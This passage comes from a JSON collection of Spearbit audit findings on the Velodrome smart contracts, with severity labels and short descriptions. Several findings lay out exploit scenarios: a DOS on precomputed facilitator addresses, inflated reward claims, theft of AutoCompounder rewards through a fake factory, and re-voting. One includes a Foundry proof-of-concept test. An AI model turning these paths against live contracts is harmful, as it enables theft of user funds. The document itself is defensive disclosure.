            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simplify check for rounding error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The check of rounding error can be simplified. Instead using A / B > 0 use A > B",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Storage declarations in the middle of the file",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "If you wish to keep the logic separate, consider creating a separate abstract contract.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent usage of _msgSender()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "There are some instances where msg.sender is used in contrast with _msgSender() function.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational Voter.sol#L75-L78,"
        ]
    },
    {
        "title": "Change emergency council should be enabled to Governor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Governor may also want to be able to set and change the emergency council, this avoids the potential risk of the council abusing their power",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary inheritance in Velo contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Velo isn't used for governance, therefore it's not necessary to inherit from ERC20Votes.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect value in Mint event",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "In Minter#update_period the Mint event is emitted with incorrect values.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Do not cache constants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It is not necessary to cache constant variable.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "First week will have no emissions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Cannot call update_period on the first week due to setting the current period to this one. Emissions will start at most one week after",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Variables can be renamed for better clarity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "For a better understanding, some variables could be renamed.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Minter week will eventually shift",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The constant WEEK is used as the duration of an epoch that resets every Thursday, after 4 years (4 * 365.25 days) the day of the week will eventually shift, not following the Thursday cadence.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Ownership change will break certain yield farming automations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Due to the check, any transfer done in the same block as the call to depositManaged will revert. While a sidestep for the mechanic for malicious users was shown, the check will prevent a common use case in Yield Farming: Zapping. Because of the check, an end user will not be able to zap from their VELO to VE to the Managed Position, which may create a sub-par experience for end users. This should also create worse UX for Yield Farming Projects as they will have to separate the transfer from the deposit which will cost them more gas and may make their product less capital efficient",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Quantitative analysis of Minter logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It will take 110 iterations to go from 15 MLN to the Tail Emission Threshold Minter.sol#L32-L37 /// @notice When emissions fall below this amount, begin tail emissions uint256 public constant TAIL_START = 5_000_000 * 1e18; /// @notice Tail emissions rate in basis points uint256 public tailEmissionRate = 30; /// @notice Starting weekly emission of 15M VELO (VELO has 18 decimals) uint256 public weekly = 15_000_000 * 1e18; ## Python allows decimal Math, wlog, just take mantissa INITIAL = 15 * 10 ** 6 TAIL = 5 * 10 ** 6 MULTIPLIER_BPS = 99_00 MAX_BPS = 10_000 value = INITIAL i = 0 min_emitted = 0 while (value > TAIL): i+= 1 min_emitted += value value = value * MULTIPLIER_BPS / MAX_BPS i 110 value 4965496.324815211 min_emitted 1003450367.5184793 ## If nobody ever bridged, this would be emissions at tail min_emitted * 30 / 10_000 3010351.1025554384 Tail emissions are most likely going to be a discrete step down in emissions >>> min_emitted 1003450367.5184793 V1_CIRC = 150 * 10 ** 6 ranges = range(V1_CIRC // 10, V1_CIRC, V1_CIRC // 10) for val in ranges: print((min_emitted + val) * 30 / 10_000) 3055351.1025554384 3100351.1025554384 3145351.1025554384 3190351.1025554384 3235351.1025554384 3280351.1025554384 3325351.1025554384 3370351.1025554384 3415351.1025554384 The last value before the tail will be most likely around 1 Million fewer tokens minted per period. Maximum Mintable Value is slightly above Tail, with Absolute Max being way above Tail 57 ## Max Supply >>> 1000 * 10 ** 6 1000000000 >>> min_emitted = 1003450367.5184793 >>> max_circ = 1000 * 10 ** 6 + min_emitted >>> max_mint = max_circ * 30 / 10_000 ## If we assume min_emitted + 1 Billion Velo V1 Sinked >>> max_mint 6010351.102555438 ## If we assume nudge to 100 BPS >>> abs_max_mint = max_circ * 100 / 10_000 >>> abs_max_mint 20034503.675184794",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Optimism's block production may change in the future",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "block number, because of OP potentially changing block frequency in the future, given Bedrocks update to block.timestamp, it may be desirable to refactor back to the OZ implementation. And VeloGorvernor assumes 2 blocks every second. In OP's docs says block.number is not a reliable timing reference: community.optimism.io/docs/developers/build/differences/#block- numbers-and-timestamps It's also dangerous to use block.number at the time cause it will probably mean a different thing in pre- and post- bedrock upgrades.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unnecessary check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "These checks are unnecessary because it already checks if targets and calldata lengths are equal to 1.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Event is missing indexed fields",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Index event fields make the field more quickly accessible to off-chain tools that parse events. How- ever, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing checks for address(0) when assigning values to address state variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Lack of zero-address validation on address parameters may lead to transaction reverts, waste gas, require resubmission of transactions and may even force contract redeployments in certain cases within the proto- col.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational FactoryRegistry.sol#L26-L28, RewardsDistributor.sol#L308,"
        ]
    },
    {
        "title": "Incorrect comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "There are a few mistakes in the comments that can be corrected in the codebase.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Discrepancies between specification and implementation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Instance 1 - Zapping The specification mentioned that it supports zapping into a pool from any token. Following is the extract  Swapping and lp depositing/withdrawing of fee-on-transfer tokens.  Zapping in and out of a pool from any token (i.e. A->(B,C) or (B,C) -> A). A can be the same as B or C.  Zapping and staking into a pool from any token. 60 However, the zapIn and zapOut functions utilize the internal _swap function that does not support fee-on-transfer tokens.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Early exit for withdrawManaged function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "VotingEscrow.withdrawManaged function.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "DOS attack at future facilitator contract and stop SinkManager.convertVe",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "As noted in \"DOS attack by delegating tokens at MAX_DELEGATES = 1024\", the old votingEscrow has a gas concern, i.e., the gas cost of transfer/ burn will increase when an address holds multiple NFT tokens. The concern becomes more serious when the protocol is deployed on Optimism, where the gas limit is smaller than other L2 chains. If an address is being attacked and holds max NFT tokens (1024), the user can not withdraw funds due to the gas limit. To mitigate the potential DOS attack where the attack DOS the v1's votingEscrow and stop sinkManager from re- ceiving tokens, the sinkManager utilize a facilitator contract. When the sinkManager needs to receive the votingE- scrow NFT, it creates a new contract specifically for this purpose. Since the contract is newly created, it does not contain any tokens, making it more gas-efficient to receive the token through the facilitator contract. However, the attacker can DOS attack the contract by sending NFT tokens to a future facilitator. salted-contract-creations-create2 When creating a contract, the address of the contract is computed from the address of the creating contract and a counter that is increased with each contract creation. The exploit scenario would be: At the time the sinkManager is deployed and zero facilitator is created. The attacker can calculate the address of all future facilitators by computing sha3(rlp.encode([normalize_address(sender), nonce]))[12:] The attacker can compute the 10-th facilitator's address and sends 1024 NFT tokens to the ad- dress. The sinkManager will function normally nine times. Though, when the 10th user wants to convert the token, the sinkManager deployed the 10th facilitator address. Since the 10th facilitator already has 1024 NFT positions, it can not receive any tokens. The transaction will revert and the sinkManager will be stuck in the current state.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "RewardDistributor caching totalSupply leading to incorrect reward calculation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "RewardDistributor distributes newly minted VELO tokens to users who locks the tokens in VotingEscrow. Since the calculation of past supply is costly, the rewardDistributor cache the supply value in uint256[1000000000000000] public veSupply. The RewardDistributor._checkpointTotalSupply function would iterate from the last updated time util the latest epoch time, fetches totalSupply from votingEscrow, and store it. Assume the following scenario when a transaction is executed at the beginning of an epoch. 1. The totalSupply is X. 2. The user calls checkpointTotalSupply. The rewardDistributor save the totalSupply = X. 3. The user creates a lock with 2X the amount of tokens. The user has balance = 2X and the totalSupply becomes 3X. 4. Fast forward to when the reward is distributed. The user claims the tokens, reward is calculated by total reward * balance / supply and user gets 2x of the total rewards.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Lack of slippage control during compounding",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "When swapping the reward tokens to VELO tokens during compounding, the slippage control is disabled by configuring the amountOutMin to zero. This can potentially expose the swap/trade to sandwich attacks and MEV (Miner Extractable Value) attacks, resulting in a suboptimal amount of VELO tokens received from the swap/trade. router.swapExactTokensForTokens( balance, 0, // amountOutMin routes, address(this), block.timestamp );",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ALLOWED_CALLER can steal all rewards from AutoCompounder using a fake factory in the route.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "AutoCompounder allows address with ALLOWED_CALLER role to trigger swapTokenToVELOAndCompound. The function sells the specified tokens to VELO. Since the Velo router supports multiple factories. An attacker can deploy a fake factory with a backdoor. By routing the swaps through the backdoor factory the attacker can steal all reward tokens in the AutoCompounder contract.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "depositManaged can be used by locks to receive unvested VELO rebase rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Velo offer rebase emissions to all Lockers. These are meant to be depositFor into an existing lock, and directly transferred if the lock just expired. The check is the following: if (_timestamp > _locked.end && !_locked.isPermanent) { By calling depositManaged we can get the check to pass for a Lock that is not expired, allowing us to receive Unvested Velo (we could sell unfairly for example). Due to how depositManaged and withdrawManaged work, the attacker would be able to perform this every other week (1 week cooldown, 1 week execution). Because of how the fact that managedRewards are delayed by a week the attacker will not lose any noticeable amount of rewards, meaning that most users would rationally opt-into performing this operation to gain an unfair advantage, or to sell their rewards each week while other Lockers are unable or unwilling to perform this operation. The following POC will show an increase in VELO balance for the tokenId2 owner in spite of the fact that the lock is not expired Logs: Epoch 1 Token Locked after Token2 Locked after User Bal after 56039811453980167852 -1000000000000000000000000 // Negative because we have `depositManaged` 56039811453980167852 // We received the token directly, unvested function testInstantClaimViaManaged() public { // Proof that if we depositManaged, we can get our rebase rewards instantly // Instead of having to vest them via the lock skipToNextEpoch(1 days); minter.updatePeriod(); console2.log(\"Epoch 1\"); VELO.approve(address(escrow), TOKEN_1M * 2); uint256 tokenId = escrow.createLock(TOKEN_1M, MAXTIME); uint256 tokenId2 = escrow.createLock(TOKEN_1M, MAXTIME); uint256 mTokenId = escrow.createManagedLockFor(address(this)); skipToNextEpoch(1 hours + 1); minter.updatePeriod(); 65 skipToNextEpoch(1 hours + 1); minter.updatePeriod(); // Now we claim for 1, showing that they incease locked int128 initialToken1 = escrow.locked(tokenId).amount; distributor.claim(tokenId); // Claimed from previous epoch console2.log(\"Token Locked after \", escrow.locked(tokenId).amount - initialToken1); // For 2, we deposit managed, then claim, showing we get tokens unlocked uint256 initialBal = VELO.balanceOf(address(this)); int128 initialToken2 = escrow.locked(tokenId2).amount; voter.depositManaged(tokenId2, mTokenId); distributor.claim(tokenId2); // Claimed from previous epoch console2.log(\"Token2 Locked after \", escrow.locked(tokenId2).amount - initialToken2); console2.log(\"User Bal after \", VELO.balanceOf(address(this)) - initialBal); }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Unnecessary slippage loss due to AutoCompounder selling VELO",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "AutoCompounder allows every address to help claim the rewards and compound to the locked VELO position. The AutoCompounder will sell _tokensToSwap into VELO. By setting VELO as _tokensToSwap, the AutoCom- pounder would do unnecessary swaps that lead to unnecessary slippage loss.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "epochVoteStart function calls the wrong library method",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The epochVoteStart function calls the VelodromeTimeLibrary.epochStart function instead of the VelodromeTimeLibrary.epochVoteStart function. Thus, the Voter.epochVoteStart function returns a voting start time without factoring in the one-hour distribution window, which might cause issues for users and developers relying on this information.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Managed NFT can vote more than once per epoch under certain circumstances",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The owner of the managed NFT could break the invariant that an NFT can only vote once per epoch Assume Bob owns the following two (2) managed NFTs:  Managed veNFT (called mNFTa) with one (1) locked NFT (called lNFTa)  Managed veNFT (called mNFTb) with one (1) locked NFT (called lNFTb)  The balance of lNFTa and lNFTb is the same Bob voted on poolx with mNFTa and mNFTb on the first hour of the epoch At the last two hours of the voting windows of the current epoch, Bob changed his mind and decided to vote on the pooly . Under normal circumstances, the onlyNewEpoch modifier will prevent mNFTa and mNFTb from triggering the Voter.vote function because these two veNFTs have already voted in the current epoch and their lastVoted is set to a timestamp within the current epoch. However, it is possible for Bob to bypass this control. Bob could call Voter.withdrawManaged function to withdraw lNFTa and lNFTb from mNFTa and mNFTb respectively. Since the weight becomes zero, the lastVoted for both mNFTa and mNFTb will be cleared. As a result, they will be allowed to re-vote in the current epoch. Bob will call Voter.depositManaged to deposit lNFTb into mNFTa and lNFTa into mNFTb respectively to increase the weight of the managed NFTs. Bob then calls Voter.vote with mNFTa and mNFTb to vote on pooly . Since the lastVoted is empty (cleared earlier), the onlyNewEpoch modifier will not revert the transaction. Understood that the team that without clearing the lastVoted, it would lead to another potential issue where a new managed NFT could potentially be made useless temporarily for an epoch. Given the managed NFT grant significant power to the owner, the team intended to restrict access to the managed NFTs and manage abuse by utilizing the emergency council/governor to deactivate non-compliant managed NFTs, thus mitigating the risks of this issue.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Invalid route is returned if token does not have a trading pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Assume that someone called the getOptimalTokenToVeloRoute function with a token called T that does not have a trading pool within Velodrome. While looping through all the ten (two) routes pre-defined in the constructor at Line 94 below, since the trading pool with T does not exist, it will keep skipping to the next route until the loop ends. As such, the index remains uninitialized at the end, meaning it holds the default value of zero. In Lines 110 to 112, it will conclude that the optimal route is as follows: routes[0] = routesTokenToVelo[index][0] = routesTokenToVelo[0][0] = address(0) <> USDC routes[1] = routesTokenToVelo[index][1] = routesTokenToVelo[0][1] = USDC <> VELO routes[0].from = token = T routes = T <> USDC <> VELO As a result, the getOptimalTokenToVeloRoute function returns an invalid route. function getOptimalTokenToVeloRoute( address token, uint256 amountIn ) external view returns (IRouter.Route[] memory) { // Get best route from multi-route paths uint256 index; uint256 optimalAmountOut; IRouter.Route[] memory routes = new IRouter.Route[](2); uint256[] memory amountsOut; // loop through multi-route paths for (uint256 i = 0; i < 10; i++) { routes[0] = routesTokenToVelo[i][0]; // Go to next route if a trading pool does not exist if (IPoolFactory(routes[0].factory).getPair(token, routes[0].to, routes[0].stable) == address(0)) continue; ,! routes[1] = routesTokenToVelo[i][1]; // Set the from token as storage does not have an address set routes[0].from = token; amountsOut = router.getAmountsOut(amountIn, routes); // amountOut is in the third index - 0 is amountIn and 1 is the first route output uint256 amountOut = amountsOut[2]; if (amountOut > optimalAmountOut) { // store the index and amount of the optimal amount out optimalAmountOut = amountOut; index = i; } } // use the optimal route determined from the loop routes[0] = routesTokenToVelo[index][0]; routes[1] = routesTokenToVelo[index][1]; routes[0].from = token; // Get amountOut from a direct route to VELO IRouter.Route[] memory route = new IRouter.Route[](1); 68 route[0] = IRouter.Route(token, velo, false, factory); amountsOut = router.getAmountsOut(amountIn, route); // compare output and return the best result return amountsOut[1] > optimalAmountOut ? route : routes; }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "SafeApprove is not used in AutoCompounder",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "safeApprove is not used in AutoCompounder. Tokens that do not follow standard ERC20 will be locked in the contract.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "balanceOfNFT can be made to return non-zero value via split and merge",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Ownership Change Sidestep via Split. Splitting allows to change the ID, and have it work. This allows to sidestep this check in VotingEscrow.sol#L1052-L1055 Meaning you can always have a non-zero balance although it requires performing some work. This could be used by integrators as a way to accurately track their own voting power.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "delegateBySig can use malleable signatures",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because the function delegateBySig uses ecrecover and doesn't check for the value of the sig- nature, other signatures, that have higher numerical values, which map to the same signature, could be used. Because the code uses nonces only one signature could be used per nonce.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Slightly Reduced Voting Power due to Rounding Error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because of rounding errors, a fully locked NFT will incur a slight loss of Vote Weight (around 27 BPS). [PASS] testCompareYieldOne() (gas: 4245851) Logs: distributor.claimable(tokenId) 0 locked.amount 1000000000000000000000000 block.timsestamp 1814399 block.timsestamp 1900800 Epoch 2 distributor.claimable(tokenId) 0 locked.amount 1000000000000000000000000 escrow.userPointHistory(tokenId, 1) 0 escrow.userPointHistory(tokenId, 1) 1814399 escrow.userPointHistory(tokenId, 1) BIAS 997260281900050656907546 escrow.userPointHistory(tokenId, tokenId2) 1814399 escrow.userPointHistory(tokenId, tokenId2) BIAS 997260281900050656907546 userPoint.ts 1814399 getCursorTs(tokenId) 1814400 userPoint.ts 1814399 epochStart(tokenId) 1814400 70 userPoint.ts 1814399 ve.balanceOfNFTAt(tokenId, getCursorTs(tokenId) - 1) 997260281900050656907546 function getCursorTs(uint256 tokenId) internal returns(uint256) { IVotingEscrow.UserPoint memory userPoint = escrow.userPointHistory(tokenId, 1); console2.log(\"userPoint.ts\", userPoint.ts); uint256 weekCursor = ((userPoint.ts + WEEK - 1) / WEEK) * WEEK; uint256 weekCursorStart = weekCursor; return weekCursorStart; } function epochStart(uint256 timestamp) internal pure returns (uint256) { unchecked { return timestamp - (timestamp % WEEK); } } function testCompareYieldOne() public { skipToNextEpoch(1 days); // Epoch 1 skipToNextEpoch(-1); // last second VELO.approve(address(escrow), TOKEN_1M * 2); uint256 tokenId = escrow.createLock(TOKEN_1M, MAXTIME); uint256 tokenId2 = escrow.createLock(TOKEN_1M, 4 * 365 * 86400); uint256 mTokenId = escrow.createManagedLockFor(address(this)); console2.log(\"distributor.claimable(tokenId)\", distributor.claimable(tokenId)); console2.log(\"locked.amount\", escrow.locked(tokenId).amount); console2.log(\"block.timsestamp\", block.timestamp); minter.updatePeriod(); // Update for 1 skipToNextEpoch(1 days); // Go next epoch minter.updatePeriod(); // and update 2 console2.log(\"block.timsestamp\", block.timestamp); console2.log(\"Epoch 2\"); //@audit here we have claimable for tokenId and mTokenId IVotingEscrow.LockedBalance memory locked = escrow.locked(tokenId); console2.log(\"distributor.claimable(tokenId)\", distributor.claimable(tokenId)); console2.log(\"locked.amount\", escrow.locked(tokenId).amount); console2.log(\"escrow.userPointHistory(tokenId, 1)\", escrow.userPointHistory(tokenId, 0).ts); console2.log(\"escrow.userPointHistory(tokenId, 1)\", escrow.userPointHistory(tokenId, 1).ts); console2.log(\"escrow.userPointHistory(tokenId, 1) BIAS\", escrow.userPointHistory(tokenId, 1).bias); ,! console2.log(\"escrow.userPointHistory(tokenId, tokenId2)\", escrow.userPointHistory(tokenId2, 1).ts); ,! console2.log(\"escrow.userPointHistory(tokenId, tokenId2) BIAS\", ,! escrow.userPointHistory(tokenId2, 1).bias); console2.log(\"getCursorTs(tokenId)\", getCursorTs(tokenId)); console2.log(\"epochStart(tokenId)\", epochStart(getCursorTs(tokenId))); console2.log(\"ve.balanceOfNFTAt(tokenId, getCursorTs(tokenId) - 1)\", ,! escrow.balanceOfNFTAt(tokenId, getCursorTs(tokenId) - 1)); } 71",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Some setters cannot be changed by governance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It was found that some setters, related to emergencyCouncil and Team can only be called by the current role owner. It may be best to allow Governance to also be able to call such setters as a way to allow it to override or replace a misaligned team. The Emergency Council can kill gauges, preventing those gauges from receiving emissions. Voter.sol#L151-L155. function setEmergencyCouncil(address _council) public { if (_msgSender() != emergencyCouncil) revert NotEmergencyCouncil(); if (_council == address(0)) revert ZeroAddress(); emergencyCouncil = _council; } The team can simply change the ArtProxy which is a cosmetic aspect of Voting Escrow. VotingEscrow.sol#L241-L245 function setTeam(address _team) external { if (_msgSender() != team) revert NotTeam(); if (_team == address(0)) revert ZeroAddress(); team = _team; }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Rebase Rewards distribution is shifted by one week, allowing new depositors to receive unfair yield initially (which they'll give back after they withdraw)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The finding is not particularly dangerous but it is notable that because Reward will allow claiming of rewards on the following Epoch, and because Rebase rewards from the Distributor Distributor.claim are distributed based on the balance at the last second of the previous epoch, a desynchronization in how rewards are distributed will happen. This will end up being fair in the long run however here's an illustrative scenario:  Locker A has a small lock, they wish to increase the amount they have locked.  They increase the amount but miss out on rebase rewards (because they are based on their balance at the last second of the previous epoch).  They decide to depositManaged which will distribute rewards based on their current balance, meaning they will \"steal\" a marginal part of the yield. 72  The next epoch, their weight will help increase the yield for everyone, and because Rebasing Rewards are distributed with a week of delay, they will eventually miss out on a similar proportion of yield they \"stole\".",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "AutoCompounder can be created without admin",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Creating an AutoCompounder contract without an _admin by passing address(0) through AutoCom- pounderFactory is possible. This will break certain functionalities in the AutoCompounder.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "claim and claimMany functions will revert when called in end lock time",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "block.timestamp >= oldLocked.end. If _timestamp == _locked.end, then depositFor() will be called but this will revert as",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Malicious Pool Factory can be used to prevent new pools from being voted on as well as brick voting locks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because gauges[_pool] can only be set once in the voter, governance has the ability to introduce a malicious factory, that will revert on command as a way to prevent normal protocol functionality as well as prevent depositors that voted on these from ever being able to unlock their NFTs  ve.withdraw requires not having voted.  To remove voting reset is called, which in turn calls IReward(gaugeToFees[gauges[_pool]])._with- draw(uint256(_votes), _tokenId);.  If a malicious gaugeToFees contract is deployed, the tokenId won't be able to ever set voted to false preventing the ability from ever withdrawing. 73",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Pool will stop working if a pausable / blockable token is blocked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Some tokens are pausable or implement a block list (e.g. USDC), if such a token is part of a Pool, and the Pool is blocked, the Pool will stop working. It's important to notice that the LP token, which wraps a deposit will still be transferable and the composability with Gauges and Reward Contracts will not be broken even when the pool is unable to function.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use ClonesWithImmutableArgs in AutoCompounderFactory saves gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The AutoCompounderFactory can utilize ClonesWithImmutableArgs to deploy new AutoCompounder contracts. This would save a lot of gas compared to the current implementation.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Convert hardcoded route to internal function in CompoundOptimizer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "All of the hardcoded route setups can be converted to an internal function with hardcoded values.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Early return in supplyAt save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "To save gas, you can return in case of _epoch is equal to zero can be made before cache _point.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Approved User could Split NFTs and be unable to continue operating",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "An approved user can be approved via approve, the storage value set is idToApprovals[_tokenId] = _approved; Splitting will create two new NFTs that will be sent to the owner. This means that an approved user would be able to split the NFTs on behalf of the owner, however, in doing so they would lose ownership of the NFTs, being unable to continue using them during the TX",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add sweep function to CompoundOptimizer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Some tokens may be completely illiquid, may not be worth auto-compounding so it would be best to also allow a way to sweep tokens out to the owner for some tokens. Examples:  Airdrops / Extra rewards.  Very new tokens that the owner wants to farm instead of dump.",
        "labels": [
